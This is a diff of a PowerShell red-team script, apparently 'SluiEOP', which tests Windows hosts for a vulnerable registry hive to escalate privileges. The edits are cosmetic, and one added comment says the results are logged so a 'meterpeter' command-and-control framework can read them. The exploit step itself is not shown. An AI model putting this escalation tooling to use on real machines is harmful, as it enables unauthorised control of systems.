@@ -246,7 +246,7 @@ If($CheckVuln -eq $True -or $param2 -eq "-Force" -or $param2 -eq "-force"){
       $GroupToken = Get-WmiObject Win32_Process -Filter "name='$ProcessToken'"|Select Name, @{Name="UserName";Expression={$_.GetOwner().Domain+"\"+$_.GetOwner().User}}|Select -Last 1|Select-Object -ExpandProperty UserName
       $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "InnerCode" -Value "$ReturnCode"
     }
-    If($EOP_Success -eq $True){$EOPState = "success"}Else{$EOPState = "error ?";$EOPID = "null"}
+    If($EOP_Success -eq $True){$EOPState = "success"}Else{$EOPState = "error?";$EOPID = "null"}
     If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Architecture" -Value "$Env:PROCESSOR_ARCHITECTURE"}
     $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "UserDomain" -Value "$Env:USERDOMAIN"
     $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
@@ -258,10 +258,11 @@ If($CheckVuln -eq $True -or $param2 -eq "-Force" -or $param2 -eq "-force"){
     If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "EOPCommand" -Value "$Command"}
     If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Owner" -Value "$GroupToken"}
     If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "OSversion" -Value "$OSversion"}
+    ## Create a logfile with the Table because meterpeter C2 can't remotely display the Table contents otherwise.
     echo $MYPSObjectTable > $Env:TMP\sLUIEop.log
 
 }Else{
-   ## Vulnerable registry Hive => not found
+   ## Vulnerable registry Hive => NOT found
    Write-Host "`nSluiEOP v1.9 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
    Write-Host "[ ERROR ] System Doesn't Seems Vulnerable, Aborting ..`n" -ForegroundColor red -BackgroundColor Black
 }
